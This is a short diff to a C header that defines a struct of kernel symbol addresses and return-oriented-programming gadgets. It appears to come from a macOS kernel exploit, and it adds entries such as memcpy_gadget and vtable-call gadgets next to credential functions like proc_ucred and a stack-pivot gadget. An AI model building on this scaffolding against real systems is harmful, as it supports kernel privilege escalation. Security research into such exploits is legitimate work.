@@ -9,11 +9,14 @@ typedef struct
     uint64_t OSObject_vtab;
     uint64_t OSObject_taggedRelease;
     uint64_t OSSerializer_serialize;
+    uint64_t OSArray_initWithArray;
     uint64_t kOSBooleanTrue;
     uint64_t current_proc;
     uint64_t proc_ucred;
     uint64_t posix_cred_get;
     uint64_t bzero;
+    uint64_t memcpy;
+    uint64_t PE_current_console;
     uint64_t vm_map_remap;
     uint64_t mach_vm_wire;
     uint64_t ipc_port_alloc_special;
@@ -27,7 +30,10 @@ typedef struct
     uint64_t mac_policy_list;
     uint64_t hibernate_machine_init;
     uint64_t _hibernateStats;
-    uint64_t add__rdi__ecx;
+    //uint64_t add__rdi__ecx;
+    uint64_t memcpy_gadget;
+    uint64_t jmp__vtab1_;
+    uint64_t mov_rsi_r15_call__vtab0_;
     uint64_t mov_rdi__rax_8__call__rax_;
     uint64_t mov_rsp_rsi_call_rdi;
     uint64_t add_rsp_0x28;
@@ -48,6 +54,7 @@ typedef struct
 
     // unslid
     uint64_t taggedRelease_vtab_offset;
+    uint64_t OSArray_array_offset;
 } rop_t;
 
 int rop_gadgets(rop_t *rop, void *kernel);
